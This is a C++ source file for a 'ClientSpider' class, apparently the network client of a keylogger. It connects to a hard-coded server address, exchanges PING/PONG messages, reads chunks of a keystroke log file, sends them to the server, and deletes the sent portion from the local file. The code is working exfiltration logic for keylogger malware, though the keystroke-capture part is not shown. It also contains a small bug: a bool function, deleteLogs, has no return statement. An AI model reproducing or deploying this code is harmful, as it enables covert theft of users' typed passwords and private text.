#include "stdafx.h"
#include "ClientSpider.h"

ClientSpider::ClientSpider(std::string &keyFileName)
	: _socket(new Socket), _nbr(0), _keyFileName(keyFileName)
{
}

ClientSpider::~ClientSpider()
{
	delete (_socket);
}

bool	ClientSpider::Launch()
{
	int res = 0;

	res = _socket->init();
	if (res == 1)
	{
		std::cerr << "fail init" << std::endl;
		return 1;
	}

	res = _socket->connectToServer("192.168.137.129", 4242);
	if (res == 1)
	{
		std::cerr << "fail connect serv" << std::endl;
		return 1;
	}
	return 0;
}

void	ClientSpider::Loop()
{
	std::string rec;
	int res = 0;
	while (rec != QUIT && res != SOCKET_ERROR)
	{
		res = _socket->Send(PING);
		res = _socket->Recv(rec, 50);
		if ((rec.find(PONG) != std::string::npos))
			res = sendLogs();
		if ((res = _socket->waitRecv()) != 0)
			res = sendLogs();
	}
}

int		ClientSpider::sendLogs()
{
	std::string logs = getLogs(2048);
	std::string envoi = SEQ + logs;
	std::string rec;
	int res = 0;

	if (logs != "")
	{
		res = _socket->Send(envoi);
		res = _socket->Recv(rec, 50);
		std::size_t found = rec.find(RECV);
		if (found != std::string::npos)
		{
			std::string tmp = "";
			size_t i = 5;
			while (i < (rec.length() - 2))
				tmp += rec[i++];
			std::istringstream buff(tmp);
			buff >> _nbr;
			deleteLogs(_nbr);
		}
	}
	return (res);
}

bool	ClientSpider::deleteLogs(int nbrToDelete)
{
	std::ifstream file;
	int i = 0;
	char c;
	std::string		tmp = "";

	file.open(_keyFileName, std::ifstream::in | std::ifstream::out);
	if (file.is_open())
	{
		while (!file.eof() && i < nbrToDelete && file.get(c))
			i++;
		while (!file.eof() && file.get(c))
			tmp += c;
		file.clear();
	}
	file.close();
	std::ofstream file2(_keyFileName);
	file2 << tmp;
	file2.close();
}

std::string		ClientSpider::getLogs(int nbrChar)
{
	std::ifstream file;
	int i = 0;
	std::string		tosend = "";

	char c;
	file.open(_keyFileName);
	if (file.is_open())
	{
		while (!file.eof() && i < nbrChar && file.get(c))
		{
			tosend += c;
			i++;
		}
	}
	file.close();
	return tosend;
}
